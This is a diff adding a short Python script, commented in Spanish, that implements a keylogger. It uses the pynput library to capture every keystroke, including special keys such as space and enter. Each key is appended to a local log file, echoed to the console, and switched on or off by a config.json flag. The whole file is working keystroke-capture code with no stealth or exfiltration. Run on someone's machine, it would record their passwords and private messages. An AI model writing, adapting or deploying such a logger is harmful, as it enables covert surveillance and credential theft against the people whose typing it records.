@@ -1,0 +1,60 @@
+import json
+from pynput import keyboard
+
+def on_keypress(key, carpeta_guardado):
+    try:
+        key_str = str(key.char)  # Intentamos obtener el carácter
+        
+        with open(carpeta_guardado, 'a') as f:
+            f.write(f'Key: {key_str}\n')
+        print(f'Key: {key_str}')
+    except AttributeError:
+        # Si no se puede obtener el carácter, verificamos si es una tecla especial
+        if key == keyboard.Key.space:
+            key_str = '(space)'
+        elif key == keyboard.Key.enter:
+            key_str = '(enter)'
+        elif isinstance(key, keyboard.KeyCode):
+            key_str = str(key)  # Utilizamos el código de tecla en caso de tecla especial
+        else:
+            key_str = str(key)  # Si no es una tecla especial, utilizamos el código de tecla
+            
+        with open(carpeta_guardado, 'a') as f:
+            f.write(f'Key: {key_str}\n')
+        print(f'Key: {key_str}')
+
+if __name__ == "__main__":
+    # Función para cargar la configuración desde un archivo JSON
+    def load_config(filename):
+        try:
+            with open(filename, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            with open('config_default.json', 'r') as default_file:
+                return json.load(default_file)
+
+    # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+
+    # Guardar la configuración inicial si el archivo no existe
+    with open(config_filename, 'w') as file:
+        json.dump(config, file, indent=4)
+
+    # Ruta del archivo donde se guardarán los registros del Keylogger     
+    carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+    keylogger_active = config.get('keylogger_active', False)
+    
+    # Definir la función on_keyrelease dentro del bloque if __name__ == "__main__":
+    def on_keyrelease(key):
+        if key == keyboard.Key.esc:
+            return False
+    
+    # Verificar si keylogger_active está activado en el config.json
+    if keylogger_active:
+        with keyboard.Listener(on_press=lambda key: on_keypress(key, carpeta_guardado), on_release=on_keyrelease) as listener:
+            listener.join()
+    else:
+        print('Se desactivó la función del keylogger en el archivo config.json')
